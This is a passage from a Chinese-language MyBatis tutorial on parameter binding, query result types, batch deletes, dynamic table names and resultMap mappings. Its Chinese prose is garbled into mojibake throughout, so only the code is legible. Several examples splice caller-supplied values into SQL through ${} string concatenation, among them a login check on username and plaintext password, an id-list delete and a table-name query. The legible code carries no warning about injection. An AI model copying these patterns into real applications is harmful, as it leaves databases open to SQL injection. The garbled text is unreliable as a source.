å°„ï¼Œç”¨äºä¸€å¯¹å¤šæˆ–å¤šå¯¹ä¸€æˆ–å­—æ®µåå’Œå±æ€§åä¸ä¸€è‡´çš„æƒ…å†µ  \n\n- å½“æŸ¥è¯¢çš„æ•°æ®ä¸ºå¤šæ¡æ—¶ï¼Œä¸èƒ½ä½¿ç”¨å®ä½“ç±»ä½œä¸ºè¿”å›å€¼ï¼Œåªèƒ½ä½¿ç”¨é›†åˆï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸`TooManyResultsException`ï¼›ä½†æ˜¯è‹¥æŸ¥è¯¢çš„æ•°æ®åªæœ‰ä¸€æ¡ï¼Œå¯ä»¥ä½¿ç”¨å®ä½“ç±»æˆ–é›†åˆä½œä¸ºè¿”å›å€¼\n\n## äº”ã€Mybatisè·å–å‚æ•°å€¼\n\n- MyBatisè·å–å‚æ•°å€¼çš„ä¸¤ç§æ–¹å¼ï¼š`${}`å’Œ`#{}`  \n- `${}`çš„æœ¬è´¨å°±æ˜¯å­—ç¬¦ä¸²æ‹¼æ¥\n  - `${}`ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼æ‹¼æ¥sqlï¼Œè‹¥ä¸ºå­—ç¬¦ä¸²ç±»å‹æˆ–æ—¥æœŸç±»å‹çš„å­—æ®µè¿›è¡Œèµ‹å€¼æ—¶ï¼Œ**éœ€è¦æ‰‹åŠ¨æ·»åŠ å•å¼•å·**\n\n- `#{}`çš„æœ¬è´¨å°±æ˜¯å ä½ç¬¦èµ‹å€¼  \n  - `#{}`ä½¿ç”¨å ä½ç¬¦èµ‹å€¼çš„æ–¹å¼æ‹¼æ¥sqlï¼Œè‹¥ä¸ºå­—ç¬¦ä¸²ç±»å‹æˆ–æ—¥æœŸç±»å‹çš„å­—æ®µè¿›è¡Œèµ‹å€¼æ—¶ï¼Œ**å¯ä»¥è‡ªåŠ¨æ·»åŠ å•å¼•å·**\n\n\n### 1.å•ä¸ªå­—é¢é‡ç±»å‹çš„å‚æ•°\n\nè‹¥mapperæ¥å£ä¸­çš„æ–¹æ³•å‚æ•°ä¸ºå•ä¸ªçš„å­—é¢é‡ç±»å‹ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨`${}`å’Œ`#{}`\n\n- ä»¥ä»»æ„çš„åç§°ï¼ˆæœ€å¥½è§åè¯†æ„ï¼‰è·å–å‚æ•°çš„å€¼ï¼Œæ³¨æ„`${}`éœ€è¦æ‰‹åŠ¨åŠ å•å¼•å·\n\n```xml\n<!--User getUserByUsername(String username);-->\n<select id=\"getUserByUsername\" resultType=\"User\">\n\tselect * from t_user where username = #{username}\n</select>\n```\n\n```xml\n<!--User getUserByUsername(String username);-->\n<select id=\"getUserByUsername\" resultType=\"User\">  \n\tselect * from t_user where username = '${username}'  \n</select>\n```\n\n```java\n@Test\npublic void testUserByUsername(){\n  SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n  UserMapper userMapper = sqlSession.getMapper(UserMapper.class);\n  User user = userMapper.getUserByUsername(\"admin\");\n  System.out.println(\"result:\" + user);\n}\n```\n\n### 2.å¤šä¸ªå­—é¢é‡ç±»å‹çš„å‚æ•°\n\nè‹¥mapperæ¥å£ä¸­çš„æ–¹æ³•å‚æ•°ä¸ºå¤šä¸ªæ—¶ï¼Œæ­¤æ—¶MyBatisä¼šè‡ªåŠ¨å°†è¿™äº›å‚æ•°æ”¾åœ¨ä¸€ä¸ªmapé›†åˆä¸­\n\n- ä»¥arg0,arg1...ä¸ºé”®ï¼Œä»¥å‚æ•°ä¸ºå€¼ï¼Œæˆ–è€…ä»¥param1,param2...ä¸ºé”®ï¼Œä»¥å‚æ•°ä¸ºå€¼ï¼›\n\n- ä½¿ç”¨argæˆ–è€…paraméƒ½è¡Œï¼Œè¦æ³¨æ„çš„æ˜¯ï¼Œargæ˜¯ä»arg0å¼€å§‹çš„ï¼Œparamæ˜¯ä»param1å¼€å§‹çš„\n\n```xml\n<!--User checkLogin(String username,String password);-->\n<select id=\"checkLogin\" resultType=\"User\">  \n\tselect * from t_user where username = #{arg0} and password = #{arg1}  \n</select>\n```\n\n```xml\n<!--User checkLogin(String username,String password);-->\n<select id=\"checkLogin\" resultType=\"User\">\n\tselect * from t_user where username = '${param1}' and password = '${param2}'\n</select>\n```\n\n```java\n@Test\npublic void testcheckLogin(){\n    SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n    UserMapper userMapper = sqlSession.getMapper(UserMapper.class);\n    User user = userMapper.checkLogin(\"admin\",\"123456\");\n    System.out.println(\"result:\" + user);\n}\n```\n\n### 3.mapé›†åˆç±»å‹çš„å‚æ•°\n\nè‹¥mapperæ¥å£ä¸­çš„æ–¹æ³•éœ€è¦çš„å‚æ•°ä¸ºå¤šä¸ªæ—¶ï¼Œæ­¤æ—¶å¯ä»¥æ‰‹åŠ¨åˆ›å»ºmapé›†åˆ\n\nå°†è¿™äº›æ•°æ®æ”¾åœ¨mapä¸­åªéœ€è¦é€šè¿‡`${}`å’Œ`#{}`è®¿é—®mapé›†åˆçš„é”®å°±å¯ä»¥è·å–ç›¸å¯¹åº”çš„å€¼ï¼Œæ³¨æ„`${}`éœ€è¦æ‰‹åŠ¨åŠ å•å¼•å·\n\n```xml\n<!--User checkLoginByMap(Map<String,Object> map);-->\n<select id=\"checkLoginByMap\" resultType=\"User\">\n\tselect * from t_user where username = #{username} and password = #{password}\n</select>\n```\n\n```java\n@Test\npublic void checkLoginByMap() {\n  SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n  UserMapper userMapper = sqlSession.getMapper(UserMapper.class);\n\tMap<String,Object> map = new HashMap<>();\n\tmap.put(\"usermane\",\"admin\");\n\tmap.put(\"password\",\"123456\");\n\tUser user = userMapper.checkLoginByMap(map);\n\tSystem.out.println(user);\n}\n```\n\n### 4.å®ä½“ç±»ç±»å‹çš„å‚æ•°\n\nè‹¥mapperæ¥å£ä¸­çš„æ–¹æ³•å‚æ•°ä¸ºå®ä½“ç±»å¯¹è±¡æ—¶æ­¤æ—¶å¯ä»¥ä½¿ç”¨`${}`å’Œ`#{}`ï¼Œé€šè¿‡è®¿é—®å®ä½“ç±»å¯¹è±¡ä¸­çš„å±æ€§åè·å–å±æ€§å€¼\n\n```xml\n<!--int insertUser(User user);-->\n<insert id=\"insertUser\">\n\tinsert into t_user values(null,#{username},#{password},#{age},#{sex},#{email})\n</insert>\n```\n\n```java\n@Test\npublic void insertUser() {\n  SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n  UserMapper userMapper = sqlSession.getMapper(UserMapper.class);\n\tUser user = new User(null,\"Tom\",\"123456\",12,\"ç”·\",\"123@321.com\");\n\tuserMapper.insertUser(user);\n}\n```\n\n### 5.ä½¿ç”¨@Paramæ ‡è¯†å‚æ•°\n\nå¯ä»¥é€šè¿‡@Paramæ³¨è§£æ ‡è¯†mapperæ¥å£ä¸­çš„æ–¹æ³•å‚æ•°ï¼Œæ­¤æ—¶ä¼šå°†è¿™äº›å‚æ•°æ”¾åœ¨mapé›†åˆä¸­ \n\n- ä»¥@Paramæ³¨è§£çš„valueå±æ€§å€¼ä¸ºé”®ï¼Œä»¥å‚æ•°ä¸ºå€¼ï¼›\n\n- ä»¥param1,param2...ä¸ºé”®ï¼Œä»¥å‚æ•°ä¸ºå€¼ï¼›\n\nåªéœ€è¦é€šè¿‡`${}`å’Œ`#{}`è®¿é—®mapé›†åˆçš„é”®å°±å¯ä»¥è·å–ç›¸å¯¹åº”çš„å€¼ï¼Œæ³¨æ„${}éœ€è¦æ‰‹åŠ¨åŠ å•å¼•å·\n\n```xml\n<!--User CheckLoginByParam(@Param(\"username\") String username, @Param(\"password\") String password);-->\n<select id=\"CheckLoginByParam\" resultType=\"User\">\n  select * from t_user where username = #{username} and password = #{password}\n</select>\n```\n```xml\n<!--User CheckLoginByParam(@Param(\"username\") String username, @Param(\"password\") String password);-->\n<select id=\"CheckLoginByParam\" resultType=\"User\">\n  select * from t_user where username = #{param1} and password = #{param2}\n</select>\n```\n\n```java\n@Test\npublic void checkLoginByParam() {\n\tSqlSession sqlSession = SqlSessionUtils.getSqlSession();\n\tUserMapper mapper = sqlSession.getMapper(UserMapper.class);\n\tmapper.CheckLoginByParam(\"admin\",\"123456\");\n}\n```\n\n### 6.æ€»ç»“\n\nå»ºè®®åˆ†æˆä¸¤ç§æƒ…å†µè¿›è¡Œå¤„ç†\n\n1. å®ä½“ç±»ç±»å‹çš„å‚æ•°\n2. ä½¿ç”¨@Paramæ ‡è¯†å‚æ•°\n\n## å…­ã€MyBatisçš„å„ç§æŸ¥è¯¢åŠŸèƒ½\n\n1. å¦‚æœæŸ¥è¯¢å‡ºçš„æ•°æ®åªæœ‰ä¸€æ¡ï¼Œå¯ä»¥é€šè¿‡\n\n- 1>å®ä½“ç±»å¯¹è±¡æ¥æ”¶ï¼š `User`\n- 2>Listé›†åˆæ¥æ”¶ï¼š `List<User>`\n- 3>Mapé›†åˆæ¥æ”¶ï¼š `Map<String, Object>`\n\n2. å¦‚æœæŸ¥è¯¢å‡ºçš„æ•°æ®æœ‰å¤šæ¡ï¼Œä¸€å®šä¸èƒ½ç”¨å®ä½“ç±»å¯¹è±¡æ¥æ”¶ï¼Œä¼šæŠ›å¼‚å¸¸TooManyResultsExceptionï¼Œå¯ä»¥é€šè¿‡\n\n- 1>å®ä½“ç±»ç±»å‹çš„Listé›†åˆæ¥æ”¶ï¼š`List<User>`\n- 2>Mapç±»å‹çš„Listé›†åˆæ¥æ”¶ï¼š`List<Map<String, Object>>`\n- 3>åœ¨mapperæ¥å£çš„æ–¹æ³•ä¸Šæ·»åŠ @MapKeyæ³¨è§£ï¼š`@MapKey(\"id\")`\n\n### 1.æŸ¥è¯¢ä¸€ä¸ªå®ä½“ç±»å¯¹è±¡\n\n```java\n//æ ¹æ®ç”¨æˆ·idæŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯\nUser getUserById(@Param(\"id\") int id);\n```\n\n```xml\n<!--User getUserById(@Param(\"id\") int id);-->\n<select id=\"getUserById\" resultType=\"User\">\n\tselect * from t_user where id = #{id}\n</select>\n```\n\n### 2.æŸ¥è¯¢ä¸€ä¸ªListé›†åˆ\n\n```java\n//æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯\nList<User> getUserList();\n```\n\n```xml\n<!--List<User> getUserList();-->\n<select id=\"getUserList\" resultType=\"User\">\n\tselect * from t_user\n</select>\n```\n\n### 3.æŸ¥è¯¢å•ä¸ªæ•°æ®\n\n```java\n// æŸ¥è¯¢ç”¨æˆ·çš„æ€»è®°å½•æ•°  \nint getCount();\n```\n\n```xml\n<!--int getCount();-->\n<select id=\"getCount\" resultType=\"integer\">\n\tselect count(id) from t_user\n</select>\n```\n\n### 4.æŸ¥è¯¢ä¸€æ¡æ•°æ®ä¸ºmapé›†åˆ\n\n```java\n//æ ¹æ®ç”¨æˆ·idæŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ä¸ºmapé›†åˆ    \nMap<String, Object> getUserToMap(@Param(\"id\") int id);\n```\n\n```xml\n<!--Map<String, Object> getUserToMap(@Param(\"id\") int id);-->\n<select id=\"getUserToMap\" resultType=\"map\">\n\tselect * from t_user where id = #{id}\n</select>\n<!--ç»“æœï¼š{password=123456, sex=ç”·, id=1, age=23, username=admin}-->\n```\n\n### 5.æŸ¥è¯¢å¤šæ¡æ•°æ®ä¸ºmapé›†åˆ\n\n#### æ–¹æ³•ä¸€\n\n```java\n//æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ä¸ºmapé›†åˆ\n//å°†è¡¨ä¸­çš„æ•°æ®ä»¥mapé›†åˆçš„æ–¹å¼æŸ¥è¯¢ï¼Œä¸€æ¡æ•°æ®å¯¹åº”ä¸€ä¸ªmapï¼›è‹¥æœ‰å¤šæ¡æ•°æ®ï¼Œå°±ä¼šäº§ç”Ÿå¤šä¸ªmapé›†åˆï¼Œæ­¤æ—¶å¯ä»¥å°†è¿™äº›mapæ”¾åœ¨ä¸€ä¸ªlisté›†åˆä¸­è·å–\nList<Map<String, Object>> getAllUserToMap();\n```\n\n```xml\n<!--Map<String, Object> getAllUserToMap();-->  \n<select id=\"getAllUserToMap\" resultType=\"map\">  \n\tselect * from t_user  \n</select>\n<!--\n\tç»“æœï¼š\n\t[{password=123456, sex=ç”·, id=1, age=23, username=admin},\n\t{password=123456, sex=ç”·, id=2, age=23, username=å¼ ä¸‰},\n\t{password=123456, sex=ç”·, id=3, age=23, username=å¼ ä¸‰}]\n-->\n```\n\n#### æ–¹æ³•äºŒ\n\n```java\n//æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ä¸ºmapé›†åˆ\n//é€šè¿‡@MapKeyæ³¨è§£è®¾ç½®mapé›†åˆçš„é”®ï¼Œå€¼æ˜¯æ¯æ¡æ•°æ®æ‰€å¯¹åº”çš„mapé›†åˆ\n@MapKey(\"id\")\nMap<String, Object> getAllUserToMap();\n```\n\n```xml\n<!--Map<String, Object> getAllUserToMap();-->\n<select id=\"getAllUserToMap\" resultType=\"map\">\n\tselect * from t_user\n</select>\n<!--\n\tç»“æœï¼š\n\t{\n\t1={password=123456, sex=ç”·, id=1, age=23, username=admin},\n\t2={password=123456, sex=ç”·, id=2, age=23, username=å¼ ä¸‰},\n\t3={password=123456, sex=ç”·, id=3, age=23, username=å¼ ä¸‰}\n\t}\n-->\n```\n\n## ä¸ƒã€ç‰¹æ®ŠSQLçš„æ‰§è¡Œ\n\n### 1.æ¨¡ç³ŠæŸ¥è¯¢\n\n```java\n//æ ¹æ®ç”¨æˆ·åè¿›è¡Œæ¨¡ç³ŠæŸ¥è¯¢\nList<User> getUserByLike(@Param(\"fuzzy_name\") String username);\n```\n\n```xml\n<!--List<User> getUserByLike(@Param(\"fuzzy_name\") String username);-->\n<select id=\"getUserByLike\" resultType=\"User\">\n\t<!--select * from t_user where username like '%${fuzzy_name}%'-->  \n\t<!--select * from t_user where username like concat('%',#{fuzzy_name},'%')-->  \n\tselect * from t_user where username like \"%\"#{fuzzy_name}\"%\"<!--æœ€å¸¸ç”¨-->  \n</select>\n```\n\n### 2.æ‰¹é‡åˆ é™¤\n\nåªèƒ½ä½¿ç”¨`${}`ï¼Œå¦‚æœä½¿ç”¨`#{}`ï¼Œåˆ™è§£æåçš„sqlè¯­å¥ä¸º`delete from t_user where id in ('1,2,3')`ï¼Œè¿™æ ·æ˜¯å°†`1,2,3`çœ‹åšæ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œåªæœ‰idä¸º`1,2,3`çš„æ•°æ®ä¼šè¢«åˆ é™¤ã€‚æ­£ç¡®çš„è¯­å¥åº”è¯¥æ˜¯`delete from t_user where id in (1,2,3)`ï¼Œæˆ–è€…`delete from t_user where id in ('1','2','3')`\n\n```java\n//æ ¹æ®idæ‰¹é‡åˆ é™¤\nint deleteMore(@Param(\"ids\") String ids);\n```\n\n```xml\n!--int deleteMore(@Param(\"ids\") String ids);-->\n<delete id=\"deleteMore\">\n\tdelete from t_user where id in (${ids})\n</delete>\n```\n\n```java\n@Test\npublic void deleteMore() {\n\tSqlSession sqlSession = SqlSessionUtils.getSqlSession();\n\tUserMapper mapper = sqlSession.getMapper(UserMapper.class);\n\tint result = mapper.deleteMore(\"1,2,3,8\");\n\tSystem.out.println(result);\n}\n```\n\n### 3.åŠ¨æ€è®¾ç½®è¡¨å\n\nåªèƒ½ä½¿ç”¨`${}`ï¼Œå› ä¸ºè¡¨åä¸èƒ½åŠ å•å¼•å·\n\n```java\n//æŸ¥è¯¢æŒ‡å®šè¡¨ä¸­çš„æ•°æ®\nList<User> getUserByTable(@Param(\"tableName\") String tableName);\n```\n\n```xml\n<!--List<User> getUserByTable(@Param(\"tableName\") String tableName);-->\n<select id=\"getUserByTable\" resultType=\"User\">\n\tselect * from ${tableName}\n</select>\n```\n\n### 4.æ·»åŠ åŠŸèƒ½è·å–è‡ªå¢çš„ä¸»é”®\n\nä¾‹å¦‚ï¼šæ·»åŠ ç­çº§ä¿¡æ¯ ï¼Œè·å–æ–°æ·»åŠ çš„ç­çº§çš„id  ï¼Œä¸ºç­çº§åˆ†é…å­¦ç”Ÿï¼Œå³å°†æŸå­¦ç”Ÿçš„ç­çº§idä¿®æ”¹ä¸ºæ–°æ·»åŠ çš„ç­çº§çš„id\n\n- t_clazz(clazz_id,clazz_name)  \n- t_student(student_id,student_name,clazz_id)  \n\nåœ¨mapper.xmlä¸­è®¾ç½®ä¸¤ä¸ªå±æ€§\n\n- useGeneratedKeysï¼šè®¾ç½®ä½¿ç”¨è‡ªå¢çš„ä¸»é”®  \n- keyPropertyï¼šå°†è‡ªå¢çš„ä¸»é”®çš„å€¼èµ‹å€¼ç»™ä¼ è¾“åˆ°æ˜ å°„æ–‡ä»¶ä¸­å‚æ•°çš„æŸä¸ªå±æ€§ï¼Œå› ä¸ºå¢åˆ æ”¹æœ‰ç»Ÿä¸€çš„è¿”å›å€¼æ˜¯å—å½±å“çš„è¡Œæ•°ï¼Œå› æ­¤åªèƒ½å°†è·å–çš„è‡ªå¢çš„ä¸»é”®æ”¾åœ¨ä¼ è¾“çš„å‚æ•°userå¯¹è±¡çš„æŸä¸ªå±æ€§ä¸­\n\n```java\n//æ·»åŠ ç”¨æˆ·ä¿¡æ¯\nvoid insertUser(User user);\n```\n\n```xml\n<!--void insertUser(User user);-->\n<insert id=\"insertUser\" useGeneratedKeys=\"true\" keyProperty=\"id\">\n\tinsert into t_user values (null,#{username},#{password},#{age},#{sex},#{email})\n</insert>\n```\n\n```java\n@Test\npublic void insertUser() {\n\tSqlSession sqlSession = SqlSessionUtils.getSqlSession();\n\tUserMapper mapper = sqlSession.getMapper(UserMapper.class);\n\tUser user = new User(null, \"ton\", \"123\", 23, \"ç”·\", \"123@321.com\");\n\tmapper.insertUser(user);\n\tSystem.out.println(user);\n}\n//è¾“å‡ºï¼šuser{id=10, username='ton', password='123', age=23, sex='ç”·', email='123@321.com'}ï¼Œè‡ªå¢ä¸»é”®å­˜æ”¾åˆ°äº†userçš„idå±æ€§ä¸­\n```\n\n## å…«ã€è‡ªå®šä¹‰æ˜ å°„resultMap\n\nå»ºç«‹ä¸¤å¼ è¡¨ï¼Œå‘˜å·¥è¡¨t_empï¼Œéƒ¨é—¨è¡¨t_dept\n\n```sql\nCREATE TABLE `t_emp` (\n  `eid` int(11) NOT NULL AUTO_INCREMENT,\n  `emp_name` varchar(20) DEFAULT NULL,\n  `age` int(11) DEFAULT NULL,\n  `sex` char(1) DEFAULT NULL,\n  `email` varchar(20) DEFAULT NULL,\n  `did` int(11) DEFAULT NULL,\n  PRIMARY KEY (`eid`)\n) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;\n```\n\n```sql\nCREATE TABLE `t_dept` (\n  `did` int(11) NOT NULL AUTO_INCREMENT,\n  `dept_name` varchar(20) DEFAULT NULL,\n  PRIMARY KEY (`did`)\n) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;\n```\n\n### 1.å¤„ç†å­—æ®µå’Œå±æ€§çš„æ˜ å°„å…³ç³»\n\næ•°æ®åº“å­—æ®µä¸€èˆ¬é‡‡ç”¨ä¸‹åˆ’çº¿ï¼ŒJavaå±æ€§ä¸€èˆ¬é‡‡ç”¨é©¼å³°ï¼Œæ‰€ä»¥å°±ä¼šé€ æˆå­—æ®µåå’Œå±æ€§åä¸ä¸€è‡´ï¼Œå¯¼è‡´æ˜ å°„ä¸äº†ï¼Œå¹¶ä¸ä¼šæŠ¥é”™ï¼Œåªæ˜¯æ— æ³•æ˜ å°„çš„å­—æ®µä¼šæ˜¾ç¤ºnull\n\n#### a.é€šè¿‡å­—æ®µåˆ«åè§£å†³\n\n```xml\n<!--List<Emp> getAllEmp();-->\n<select id=\"getAllEmp\" resultType=\"Emp\">\n  <!--select * from t_emp-->\n  select eid,emp_name empName,age,sex,email from t_emp  <!--è®¾ç½®emp_nameåˆ«åempName-->\n</select>\n```\n\n```java\n@Test\npublic void testGetAllEmp(){\n    SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n    EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n    List<Emp> list = mapper.getAllEmp();\n    list.forEach(emp -> System.out.println(emp));\n}\n```\n\n#### b.é€šè¿‡æ ¸å¿ƒé…ç½®è§£å†³\n\n```xml\n<settings>\n  <!--å°†è¡¨ä¸­å­—æ®µçš„ä¸‹åˆ’çº¿è‡ªåŠ¨è½¬æ¢ä¸ºé©¼å³° emp_nameï¼šempName-->\n  <setting name=\"mapUnderscoreToCamelCase\" value=\"true\"/>\n</settings>\n```\n\n```xml\n<!--List<Emp> getAllEmp();-->\n<select id=\"getAllEmp\" resultType=\"Emp\">\n  select * from t_emp\n</select>\n```\n\n#### c.é€šè¿‡resultMapè§£å†³\n\nè‹¥æ•°æ®åº“è¡¨ä¸­å­—æ®µåå’Œå®ä½“ç±»ä¸­çš„å±æ€§åä¸ä¸€è‡´ï¼Œåˆ™å¯ä»¥é€šè¿‡resultMapè®¾ç½®è‡ªå®šä¹‰æ˜ å°„\n\n> æ³¨ï¼šéƒ¨åˆ†å­—æ®µåå’Œå±æ€§åä¸€è‡´çš„å±æ€§å¯ä»¥ä¸ç”¨æ˜ å°„\n\n```xml\n<resultMap id=\"empResultMap\" type=\"Emp\">\n    <id property=\"eid\" column=\"eid\"></id>\n    <result property=\"empName\" column=\"emp_name\"></result>\n    <result property=\"age\" column=\"age\"></result>\n    <result property=\"sex\" column=\"sex\"></result>\n    <result property=\"email\" column=\"email\"></result>\n</resultMap>\n<select id=\"getAllEmp\" resultMap=\"empResultMap\">\n  \tselect * from t_emp\n</select>\n```\n\nresultMapï¼šè®¾ç½®è‡ªå®šä¹‰æ˜ å°„  \n\n- å±æ€§ï¼š  \n  - idï¼šè¡¨ç¤ºè‡ªå®šä¹‰æ˜ å°„çš„å”¯ä¸€æ ‡è¯†ï¼Œä¸èƒ½é‡å¤\n   - typeï¼šæŸ¥è¯¢çš„æ•°æ®è¦æ˜ å°„çš„å®ä½“ç±»çš„ç±»å‹  \n- å­æ ‡ç­¾ï¼š  \n  - idï¼šè®¾ç½®ä¸»é”®çš„æ˜ å°„å…³ç³»  \n  - resultï¼šè®¾ç½®æ™®é€šå­—æ®µçš„æ˜ å°„å…³ç³»  \n- å­æ ‡ç­¾å±æ€§ï¼š  \n  - propertyï¼šè®¾ç½®æ˜ å°„å…³ç³»ä¸­å®ä½“ç±»ä¸­çš„å±æ€§å  \n  - columnï¼šè®¾ç½®æ˜ å°„å…³ç³»ä¸­è¡¨ä¸­çš„å­—æ®µå\n\n### 2.å¤šå¯¹ä¸€æ˜ å°„å¤„ç†\n\n>æŸ¥è¯¢å‘˜å·¥ä¿¡æ¯ä»¥åŠå‘˜å·¥æ‰€å¯¹åº”çš„éƒ¨é—¨ä¿¡æ¯\n\n```java\npublic class Emp {  \n\tprivate Integer eid;  \n\tprivate String empName;  \n\tprivate Integer age;  \n\tprivate String sex;  \n\tprivate String email;  \n\tprivate Dept dept;\n\t//...æ„é€ å™¨ã€getã€setã€toStringæ–¹æ³•\n}\n```\n\n#### a.çº§è”æ–¹å¼å¤„ç†æ˜ å°„å…³ç³»\n\n```xml\n<resultMap id=\"empAndDeptResultMapOne\" type=\"Emp\">\n\t<id property=\"eid\" column=\"eid\"></id>\n\t<result property=\"empName\" column=\"emp_name\"></result>\n\t<result property=\"age\" column=\"age\"></result>\n\t<result property=\"sex\" column=\"sex\"></result>\n\t<result property=\"email\" column=\"email\"></result>\n\t<result property=\"dept.did\" column=\"did\"></result>\n\t<result property=\"dept.deptName\" column=\"dept_name\"></result>\n</resultMap>\n<!--Emp getEmpAndDept(@Param(\"eid\")Integer eid);-->\n<select id=\"getEmpAndDept\" resultMap=\"empAndDeptResultMapOne\">\n\tselect * from t_emp left join t_dept on t_emp.did = t_dept.did where t_emp.eid = #{eid}\n</select>\n```\n\n#### b.associationå¤„ç†æ˜ å°„å…³ç³»\n\n```xml\n<resultMap id=\"empAndDeptResultMapTwo\" type=\"Emp\">\n\t<id property=\"eid\" column=\"eid\"></id>\n\t<result property=\"empName\" column=\"emp_name\"></result>\n\t<result property=\"age\" column=\"age\"></result>\n\t<result property=\"sex\" column=\"sex\"></result>\n\t<result property=\"email\" column=\"email\"></result>\n\t<association property=\"dept\" javaType=\"Dept\">\n\t\t<id property=\"did\" column=\"did\"></id>\n\t\t<result property=\"deptName\" column=\"dept_name\"></result>\n\t</association>\n</resultMap>\n<!--Emp getEmpAndDept(@Param(\"eid\")Integer eid);-->\n<select id=\"getEmpAndDept\" resultMap=\"empAndDeptResultMapTwo\">\n\tselect * from t_emp left join t_dept on t_emp.did = t_dept.did where t_emp.eid = #{eid}\n</select>\n```\n\n- associationï¼šå¤„ç†å¤šå¯¹ä¸€çš„æ˜ å°„å…³ç³»\n- propertyï¼šéœ€è¦å¤„ç†å¤šå¯¹çš„æ˜ å°„å…³ç³»çš„å±æ€§å\n- javaTypeï¼šè¯¥å±æ€§çš„ç±»å‹\n\n#### c.åˆ†æ­¥æŸ¥è¯¢\n\n##### step1. æŸ¥è¯¢å‘˜å·¥ä¿¡æ¯\n\n```java\n//EmpMapperé‡Œçš„æ–¹æ³•\n/**\n * é€šè¿‡åˆ†æ­¥æŸ¥è¯¢ï¼Œå‘˜å·¥åŠæ‰€å¯¹åº”çš„éƒ¨é—¨ä¿¡æ¯\n * åˆ†æ­¥æŸ¥è¯¢ç¬¬ä¸€æ­¥ï¼šæŸ¥è¯¢å‘˜å·¥ä¿¡æ¯\n */\nEmp getEmpAndDeptByStepOne(@Param(\"eid\") Integer eid);\n```\n\n```xml\n<resultMap id=\"empAndDeptByStepResultMap\" type=\"Emp\">\n\t<id property=\"eid\" column=\"eid\"></id>\n\t<result property=\"empName\" column=\"emp_name\"></result>\n\t<result property=\"age\" column=\"age\"></result>\n\t<result property=\"sex\" column=\"sex\"></result>\n\t<result property=\"email\" column=\"email\"></result>\n\t<association property=\"dept\"\n\t\t\t\t select=\"com.jianjian.mapper.DeptMapper.getEmpAndDeptByStepTwo\" column=\"did\">  \n  </association>\n</resultMap>\n<!--Emp getEmpAndDeptByStepOne(@Param(\"eid\") Integer eid);-->\n<select id=\"getEmpAndDeptByStepOne\" resultMap=\"empAndDeptByStepResultMap\">\n\tselect * from t_emp where eid = #{eid}\n</select>\n```\n\n- selectï¼šè®¾ç½®åˆ†å¸ƒæŸ¥è¯¢çš„sqlçš„å”¯ä¸€æ ‡è¯†ï¼ˆnamespace.sqlIdæˆ–mapperæ¥å£çš„å…¨ç±»å.æ–¹æ³•åï¼‰\n- columnï¼šè®¾ç½®åˆ†æ­¥æŸ¥è¯¢çš„æ¡ä»¶\n\n##### step2. æŸ¥è¯¢éƒ¨é—¨ä¿¡æ¯\n\n```java\n//DeptMapperé‡Œçš„æ–¹æ³•\n/**\n * é€šè¿‡åˆ†æ­¥æŸ¥è¯¢ï¼Œå‘˜å·¥åŠæ‰€å¯¹åº”çš„éƒ¨é—¨ä¿¡æ¯\n * åˆ†æ­¥æŸ¥è¯¢ç¬¬äºŒæ­¥ï¼šé€šè¿‡didæŸ¥è¯¢å‘˜å·¥å¯¹åº”çš„éƒ¨é—¨ä¿¡æ¯\n */\nDept getEmpAndDeptByStepTwo(@Param(\"did\") Integer did);\n```\n\n```xml\n<!--æ­¤å¤„çš„resultMapä»…æ˜¯å¤„ç†å­—æ®µå’Œå±æ€§çš„æ˜ å°„å…³ç³»-->\n<resultMap id=\"EmpAndDeptByStepTwoResultMap\" type=\"Dept\">\n\t<id property=\"did\" column=\"did\"></id>\n\t<result property=\"deptName\" column=\"dept_name\"></result>\n</resultMap>\n<!--Dept getEmpAndDeptByStepTwo(@Param(\"did\") Integer did);-->\n<select id=\"getEmpAndDeptByStepTwo\" resultMap=\"EmpAndDeptByStepTwoResultMap\">\n\tselect * from t_dept where did = #{did}\n</select>\n```\n\n```xml\n<!--æ ¸å¿ƒé…ç½®æ–‡ä»¶ä¸­å¼€å¯ä¸‹åˆ’çº¿è‡ªåŠ¨è½¬æ¢ä¸ºé©¼å³°ï¼Œå¯ç›´æ¥ç”¨resultType-->\n<!--Dept getEmpAndDeptByStepTwo(@Param(\"did\") Integer did);-->\n<select id=\"getEmpAndDeptByStepTwo\" resultType=\"Dept\">\n  select * from t_dept where did = #{did}\n</select>\n```\n\n```java\n@Test\npublic void testGetEmpAndDeptByStep(){\n    SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n    EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n    Emp empAndDeptByStepOne = mapper.getEmpAndDeptByStepOne(4);\n    System.out.println(\"empAndDeptByStepOne = \" + empAndDeptByStepOne);\n}\n```\n\n### 3.ä¸€å¯¹å¤šæ˜ å°„å¤„ç†\n\n> æŸ¥è¯¢éƒ¨é—¨ä»¥åŠæ‰€å¯¹åº”çš„å‘˜å·¥ä¿¡æ¯\n\n```java\npublic class Dept {\n    private Integer did;\n    private String deptName;\n    private List<Emp> emps;\n\t  //...æ„é€ å™¨ã€getã€setã€toStringæ–¹æ³•\n}\n```\n\n#### a.collection\n\ncollectionï¼šç”¨æ¥å¤„ç†ä¸€å¯¹å¤šçš„æ˜ å°„å…³ç³»\n\n- propertyï¼šéœ€è¦å¤„ç†å¤šå¯¹çš„æ˜ å°„å…³ç³»çš„å±æ€§å\n- ofTypeï¼šè¡¨ç¤ºè¯¥å±æ€§å¯¹åº”çš„é›†åˆä¸­å­˜å‚¨çš„æ•°æ®çš„ç±»å‹\n\n```xml\n<resultMap id=\"DeptAndEmpResultMap\" 